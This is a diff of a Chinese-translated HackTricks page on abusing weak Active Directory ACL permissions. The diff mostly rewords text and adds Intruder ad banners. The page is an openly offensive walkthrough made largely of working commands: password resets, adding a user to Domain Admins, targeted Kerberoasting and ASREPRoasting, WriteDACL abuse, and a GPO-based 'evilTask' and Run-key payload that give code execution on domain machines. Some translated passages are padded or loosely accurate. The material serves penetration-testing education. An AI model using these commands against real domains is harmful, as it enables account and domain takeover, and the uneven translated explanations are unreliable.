@@ -2,7 +2,7 @@
 
 <details>
 
-<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks云 ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 推特 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
+<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
 
 * 你在一个**网络安全公司**工作吗？你想在HackTricks中看到你的**公司广告**吗？或者你想获得**PEASS的最新版本或下载PDF格式的HackTricks**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
 * 发现我们的独家[NFTs](https://opensea.io/collection/the-peass-family)收藏品[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
@@ -12,17 +12,25 @@
 
 </details>
 
+<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>
+
+找到最重要的漏洞，以便您可以更快地修复它们。Intruder跟踪您的攻击面，运行主动威胁扫描，发现整个技术堆栈中的问题，从API到Web应用程序和云系统。[**立即免费试用**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks)。
+
+{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}
+
+***
+
 ## 上下文
 
-这个实验室是为了滥用Active Directory Discretionary Access Control Lists (DACLs)和Acccess Control Entries (ACEs)的弱权限。
+这个实验室是为了滥用Active Directory Discretionary Access Control Lists (DACLs)和Acccess Control Entries (ACEs)的弱权限，这些权限构成了DACLs。
 
-Active Directory对象，如用户和组，是可保护的对象，DACL/ACEs定义了谁可以读取/修改这些对象（例如更改帐户名称，重置密码等）。
+Active Directory对象（如用户和组）是可保护的对象，DACL/ACEs定义了谁可以读取/修改这些对象（例如更改帐户名称，重置密码等）。
 
 这里是"Domain Admins"可保护对象的一些ACEs示例：
 
 ![](../../../.gitbook/assets/1.png)
 
-作为攻击者，我们对一些Active Directory对象的权限和类型感兴趣：
+作为攻击者，我们对一些Active Directory对象权限和类型感兴趣：
 
 * **GenericAll** - 对对象拥有完全权限（添加用户到组或重置用户密码）
 * **GenericWrite** - 更新对象的属性（例如登录脚本）
@@ -34,7 +42,7 @@ Active Directory对象，如用户和组，是可保护的对象，DACL/ACEs定�
 
 在这个实验室中，我们将探索并尝试利用上述大部分ACEs。
 
-值得熟悉所有的[BloodHound edges](https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html)和尽可能多的Active Directory [Extended Rights](https://learn.microsoft.com/en-us/windows/win32/adschema/extended-rights)，因为你永远不知道在评估过程中是否会遇到一个不常见的权限。
+值得熟悉所有[BloodHound edges](https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html)和尽可能多的Active Directory [Extended Rights](https://learn.microsoft.com/en-us/windows/win32/adschema/extended-rights)，因为你永远不知道在评估过程中可能会遇到一个不常见的权限。
 
 ## 用户上的GenericAll
 
@@ -42,7 +50,7 @@ Active Directory对象，如用户和组，是可保护的对象，DACL/ACEs定�
 ```csharp
 Get-ObjectAcl -SamAccountName delegate -ResolveGUIDs | ? {$_.ActiveDirectoryRights -eq "GenericAll"}
 ```
-我们可以看到，我们的用户`spotless`确实拥有`GenericAll`权限，这有效地使攻击者能够接管该帐户：
+我们可以看到，确实我们的用户`spotless`拥有`GenericAll`权限，这有效地使攻击者能够接管该账户：
 
 ![](../../../.gitbook/assets/2.png)
 
@@ -51,21 +59,21 @@ Get-ObjectAcl -SamAccountName delegate -ResolveGUIDs | ? {$_.ActiveDirectoryRigh
 ```bash
 net user <username> <password> /domain
 ```
-*   **定向Kerberoasting**：您可以在该帐户上设置**SPN**，使用户成为**kerberoastable**，然后对其进行kerberoast并尝试离线破解：
+*   **有针对性的Kerberoasting**：您可以在该账户上设置一个**SPN**，使用户成为**kerberoastable**，然后对其进行kerberoast并尝试离线破解：
 
 ```powershell
 # 设置SPN
 Set-DomainObject -Credential $creds -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}
-# 获取哈希
+# 获取哈希值
 .\Rubeus.exe kerberoast /user:<username> /nowrap
 # 清除SPN
 Set-DomainObject -Credential $creds -Identity <username> -Clear serviceprincipalname -Verbose
 
 # 您还可以使用工具https://github.com/ShutdownRepo/targetedKerberoast
-# 获取一个或所有用户的哈希
+# 获取一个或所有用户的哈希值
 python3 targetedKerberoast.py -domain.local -u <username> -p password -v
 ```
-*   **定向ASREPRoasting**：您可以通过**禁用** **预身份验证**来使用户**ASREPRoastable**，然后对其进行ASREProast。
+*   **有针对性的ASREPRoasting**：您可以通过**禁用** **预身份验证**来使用户成为**ASREPRoastable**，然后对其进行ASREProast。
 
 ```powershell
 Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
@@ -73,7 +81,7 @@ Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
 
 ## Group上的GenericAll权限
 
-让我们看看`Domain admins`组是否具有任何弱权限。首先，让我们获取其`distinguishedName`：
+让我们看看`Domain admins`组是否有任何弱权限。首先，让我们获取其`distinguishedName`：
 ```csharp
 Get-NetGroup "domain admins" -FullData
 ```
@@ -91,7 +99,7 @@ net group "domain admins" spotless /add /domain
 ```
 ![](../../../.gitbook/assets/6.gif)
 
-同样可以使用Active Directory或PowerSploit模块来实现：
+同样可以通过Active Directory或PowerSploit模块实现：
 ```csharp
 # with active directory module
 Add-ADGroupMember -Identity "domain admins" -Members spotless
@@ -102,7 +110,7 @@ Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.
 ## GenericAll / GenericWrite / Write on Computer/User
 
 * 如果您在**计算机对象**上拥有这些权限，您可以执行[Kerberos **基于资源的受限委派**：接管计算机对象](../resource-based-constrained-delegation.md)。
-* 如果您对用户拥有这些权限，您可以使用本页面中[第一个方法](./#genericall-on-user)中解释的方法之一。
+* 如果您对用户拥有这些权限，您可以使用本页中[第一个方法](./#genericall-on-user)中解释的方法之一。
 * 或者，无论是在计算机还是用户上，您都可以使用**影子凭据**来冒充它：
 
 {% content-ref url="shadow-credentials.md" %}
@@ -155,7 +163,7 @@ Set-DomainUserPassword -Identity delegate -Verbose
 ```
 ![](../../../.gitbook/assets/14.png)
 
-另一种不需要与密码安全字符串转换纠缠的方法是：
+另一种方法不需要与密码安全字符串转换相关的操作：
 ```csharp
 $c = Get-Credential
 Set-DomainUserPassword -Identity delegate -AccountPassword $c.Password -Verbose
@@ -199,27 +207,19 @@ Set-DomainObjectOwner -Identity Herman -OwnerIdentity nico
 
 ## 对用户的GenericWrite权限滥用
 
-在Active Directory中，GenericWrite权限允许用户对对象的属性进行写入操作，包括对对象的许多敏感属性进行修改。这些属性包括用户密码、组成员资格和其他重要信息。
+在Active Directory中，GenericWrite权限是一种特殊的权限，它允许用户对对象的属性进行写入操作，而不需要具体的写入权限。这意味着，如果一个用户被授予了GenericWrite权限，他可以修改对象的任何属性，包括敏感属性，而不需要其他特定的权限。
 
-攻击者可以通过滥用GenericWrite权限来实现持久性访问。以下是一种常见的滥用方法：
+攻击者可以利用这个权限来实现持久性滥用。他们可以通过修改用户的属性，将自己添加到目标用户的组中，或者修改目标用户的权限，以获取更高的权限。
 
-1. 获取对目标用户的WriteProperty权限。
-2. 使用WriteProperty权限修改目标用户的成员属性，将攻击者的账户添加到目标用户所在的高权限组中。
-3. 攻击者现在具有高权限组的成员身份，可以利用这些权限进行进一步的攻击，例如修改其他用户的属性、创建后门账户等。
+以下是利用GenericWrite权限进行持久性滥用的步骤：
 
-这种滥用方法的关键在于获取对目标用户的WriteProperty权限。攻击者可以通过以下方式获取该权限：
+1. 确定目标用户的对象的Distinguished Name（DN）。
+2. 使用工具（如PowerShell）或代码，将自己添加到目标用户的组中，或修改目标用户的权限。
+3. 验证修改是否成功。
 
-- 利用已知的漏洞或弱密码来获取目标用户的凭证。
-- 利用域内的其他权限滥用方法，例如Pass the Hash攻击或Golden Ticket攻击。
+这种滥用方法的危害性在于，攻击者可以通过滥用GenericWrite权限，实现对目标用户的持久性控制，并且这种滥用方法很难被检测到。
 
-为了防止GenericWrite权限的滥用，可以采取以下措施：
-
-- 限制用户对敏感属性的写入权限。
-- 定期审查高权限组的成员，并删除不必要的成员。
-- 实施强密码策略，以防止密码被猜测或暴力破解。
-- 定期审查域内的权限配置，确保没有存在滥用权限的漏洞。
-
-通过采取这些措施，可以减少攻击者滥用GenericWrite权限的风险，并提高Active Directory的安全性。
+为了防止这种滥用，管理员应该审查和限制用户的权限，确保只有必要的权限被授予。此外，监控和审计Active Directory的变更也是非常重要的，以便及时发现和响应任何异常活动。
 ```csharp
 Get-ObjectAcl -ResolveGUIDs -SamAccountName delegate | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
 ```
@@ -247,19 +247,27 @@ Get-DomainGroupMember -Identity "Group Name" | Select MemberName
 # Remove group member
 Remove-DomainGroupMember -Credential $creds -Identity "Group Name" -Members 'username' -Verbose
 ```
+<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>
+
+找出最重要的漏洞，以便更快地修复它们。Intruder跟踪您的攻击面，运行主动威胁扫描，发现整个技术堆栈中的问题，从API到Web应用程序和云系统。[**立即免费试用**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks)。
+
+{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}
+
+***
+
 ## WriteDACL + WriteOwner
 
-如果你是一个组的所有者，就像我是一个`Test` AD组的所有者：
+如果您是一个组的所有者，就像我是一个`Test` AD组的所有者一样：
 
 ![](../../../.gitbook/assets/22.png)
 
-当然，你可以通过PowerShell来实现：
+当然，您可以通过powershell来完成：
 ```csharp
 ([ADSI]"LDAP://CN=test,CN=Users,DC=offense,DC=local").PSBase.get_ObjectSecurity().GetOwner([System.Security.Principal.NTAccount]).Value
 ```
 ![](../../../.gitbook/assets/23.png)
 
-如果你对AD对象有`WriteDACL`权限：
+如果你对该AD对象有`WriteDACL`权限：
 
 ![](../../../.gitbook/assets/24.png)
 
@@ -302,7 +310,7 @@ Set-Acl -Path $path -AclObject $acl
 ```bash
 Get-ObjectAcl -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
 ```
-下面表明用户`offense\spotless`具有**WriteProperty**、**WriteDacl**、**WriteOwner**等权限，这些权限都可以被滥用：
+下面显示了用户`offense\spotless`具有**WriteProperty**、**WriteDacl**、**WriteOwner**等权限，这些权限都可以被滥用：
 
 ![](../../../.gitbook/assets/a14.png)
 
@@ -312,79 +320,65 @@ Get-ObjectAcl -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
 
 ![](../../../.gitbook/assets/a15.png)
 
-如果我们想要专门搜索配置错误的GPO，可以使用PowerSploit中的多个cmdlet链接起来，如下所示：
+如果我们想要专门搜索配置错误的GPO，可以使用PowerSploit的多个cmdlet链接起来，如下所示：
 ```powershell
 Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name} | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
 ```
-**应用了特定策略的计算机**
+![](../../../.gitbook/assets/a16.png)
 
-我们现在可以解析应用了GPO“配置错误策略”的计算机名称：
+**应用了给定策略的计算机**
+
+我们现在可以解析应用了GPO“配置错误的策略”的计算机名称：
 ```powershell
 Get-NetOU -GUID "{DDC640FF-634A-4442-BC2E-C05EED132F0C}" | % {Get-NetComputer -ADSpath $_}
 ```
 **应用于特定计算机的策略**
 
-The following command can be used to list the policies applied to a given computer:
+The following section describes the process of identifying the policies applied to a given computer in an Active Directory environment.
 
-以下命令可用于列出应用于特定计算机的策略：
+以下部分描述了在Active Directory环境中识别应用于特定计算机的策略的过程。
 
-```plaintext
-gpresult /scope computer /r
-```
+1. Open a command prompt as an administrator.
 
-**List of Applied Policies**
+   以管理员身份打开命令提示符。
 
-**已应用策略列表**
+2. Run the following command to retrieve the applied policies:
 
-The output of the above command will display a list of applied policies, including the policy name, the winning GPO (Group Policy Object), and the policy setting.
+   运行以下命令以检索应用的策略：
 
-上述命令的输出将显示已应用策略的列表，包括策略名称、获胜的 GPO（组策略对象）和策略设置。
+   ```plaintext
+   gpresult /scope computer /v
+   ```
 
-**Policies Applied to a Given User**
+   This command will display detailed information about the policies applied to the computer.
 
-**应用于特定用户的策略**
+   此命令将显示有关应用于计算机的策略的详细信息。
 
-The following command can be used to list the policies applied to a given user:
+3. Look for the section titled "Applied Group Policy Objects" in the command output.
 
-以下命令可用于列出应用于特定用户的策略：
+   在命令输出中查找标题为“Applied Group Policy Objects”的部分。
 
-```plaintext
-gpresult /scope user /r
-```
+4. Under this section, you will find a list of Group Policy Objects (GPOs) that are applied to the computer.
 
-**List of Applied Policies**
+   在此部分下，您将找到应用于计算机的一系列组策略对象（GPO）。
 
-**已应用策略列表**
+5. Each GPO will be listed with its unique identifier (GUID) and the order in which it is applied.
 
-The output of the above command will display a list of applied policies, including the policy name, the winning GPO (Group Policy Object), and the policy setting.
+   每个GPO都将列出其唯一标识符（GUID）和应用顺序。
 
-上述命令的输出将显示已应用策略的列表，包括策略名称、获胜的 GPO（组策略对象）和策略设置。
+6. Make note of the GPOs applied to the computer for further analysis.
 
-**Modifying Policies**
+   记下应用于计算机的GPO，以便进行进一步分析。
 
-**修改策略**
+By identifying the policies applied to a given computer, you can gain insights into the security configurations and restrictions enforced on that system. This information can be useful for understanding the potential attack surface and planning further exploitation techniques.
 
-To modify a policy, you can use the following command:
-
-要修改策略，可以使用以下命令：
-
-```plaintext
-gpupdate /force
-```
-
-This command will force an immediate update of the policies applied to the computer or user.
-
-此命令将立即强制更新应用于计算机或用户的策略。
-
-**Note:** Modifying policies may require administrative privileges.
-
-**注意：**修改策略可能需要管理员权限。
+通过识别应用于特定计算机的策略，您可以了解该系统上实施的安全配置和限制。这些信息对于了解潜在的攻击面和规划进一步的利用技术非常有用。
 ```powershell
 Get-DomainGPO -ComputerIdentity ws01 -Properties Name, DisplayName
 ```
 ![](https://blobs.gitbook.com/assets%2F-LFEMnER3fywgFHoroYn%2F-LWNAqc8wDhu0OYElzrN%2F-LWNBOmSsNrObOboiT2E%2FScreenshot%20from%202019-01-16%2019-44-19.png?alt=media\&token=34332022-c1fc-4f97-a7e9-e0e4d98fa8a5)
 
-**应用了给定策略的组织单位（OUs）**
+**应用给定策略的组织单位（OUs）**
 ```powershell
 Get-DomainOU -GPLink "{DDC640FF-634A-4442-BC2E-C05EED132F0C}" -Properties DistinguishedName
 ```
@@ -392,7 +386,7 @@ Get-DomainOU -GPLink "{DDC640FF-634A-4442-BC2E-C05EED132F0C}" -Properties Distin
 
 ### **滥用GPO -** [New-GPOImmediateTask](https://github.com/3gstudent/Homework-of-Powershell/blob/master/New-GPOImmediateTask.ps1)
 
-滥用此配置错误并获得代码执行的一种方法是通过GPO创建一个立即执行的计划任务，如下所示：
+滥用此配置错误并获得代码执行的一种方法是通过GPO创建一个立即计划任务，如下所示：
 ```powershell
 New-GPOImmediateTask -TaskName evilTask -Command cmd -CommandArguments "/c net localgroup administrators spotless /add" -GPODisplayName "Misconfigured Policy" -Verbose -Force
 ```
@@ -414,7 +408,7 @@ New-GPO -Name "Evil GPO" | New-GPLink -Target "OU=Workstations,DC=dev,DC=domain,
 ## Search a shared folder where you can write and all the computers affected can read
 Set-GPPrefRegistryValue -Name "Evil GPO" -Context Computer -Action Create -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "Updater" -Value "%COMSPEC% /b /c start /b /min \\dc-2\software\pivot.exe" -Type ExpandString
 ```
-这个payload在GPO更新后，还需要有人登录到计算机上。
+这个payload在GPO更新后，还需要有人登录到计算机内。
 
 ### [**SharpGPOAbuse**](https://github.com/FSecureLABS/SharpGPOAbuse) **- 滥用GPO**
 
@@ -517,7 +511,7 @@ Set-GPPrefRegistryValue -Name "Evil GPO" -Context Computer -Action Create -Key "
 ```
 {% endcode %}
 
-此外，我们可以考虑利用登录/注销脚本，使用注册表进行自启动，安装.msi，编辑服务等方式进行代码执行。
+此外，我们可以考虑利用登录/注销脚本，使用注册表进行自启动，安装.msi，编辑服务和类似的代码执行途径。
 
 ## 参考资料
 
@@ -528,14 +522,21 @@ Set-GPPrefRegistryValue -Name "Evil GPO" -Context Computer -Action Create -Key "
 * [https://adsecurity.org/?p=3658](https://adsecurity.org/?p=3658)
 * [https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System\_DirectoryServices\_ActiveDirectoryAccessRule\_\_ctor\_System\_Security\_Principal\_IdentityReference\_System\_DirectoryServices\_ActiveDirectoryRights\_System\_Security\_AccessControl\_AccessControlType\_](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System\_DirectoryServices\_ActiveDirectoryAccessRule\_\_ctor\_System\_Security\_Principal\_IdentityReference\_System\_DirectoryServices\_ActiveDirectoryRights\_System\_Security\_AccessControl\_AccessControlType\_)
 
+<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>
+
+找到最重要的漏洞，以便更快地修复它们。Intruder跟踪您的攻击面，运行主动威胁扫描，发现整个技术堆栈中的问题，从API到Web应用程序和云系统。[**立即免费试用**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks)。
+
+{% embed url="https://www.intruder.io/?utm\_campaign=hacktricks&utm\_source=referral" %}
+
+
 <details>
 
 <summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
 
-* 你在一家**网络安全公司**工作吗？想要在HackTricks中**宣传你的公司**吗？或者想要**获取PEASS的最新版本或下载HackTricks的PDF**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
-* 发现我们的独家[NFTs](https://opensea.io/collection/the-peass-family)收藏品[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
-* 获取[**官方PEASS和HackTricks的衣物**](https://peass.creator-spring.com)
-* **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f)或[**电报群组**](https://t.me/peass)，或**关注**我在**Twitter**上的[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
-* **通过向**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **和**[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **提交PR来分享你的黑客技巧。**
+* 您在**网络安全公司**工作吗？您想在HackTricks中看到您的**公司广告**吗？或者您想获得最新版本的PEASS或下载PDF格式的HackTricks吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
+* 发现我们的独家[NFT](https://opensea.io/collection/the-peass-family)收藏品[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
+* 获取[**官方PEASS和HackTricks衣物**](https://peass.creator-spring.com)
+* **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f)或[**电报群组**](https://t.me/peass)，或在**Twitter**上**关注**我[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
+* **通过向**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **和**[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **提交PR来分享您的黑客技巧。**
 
 </details>
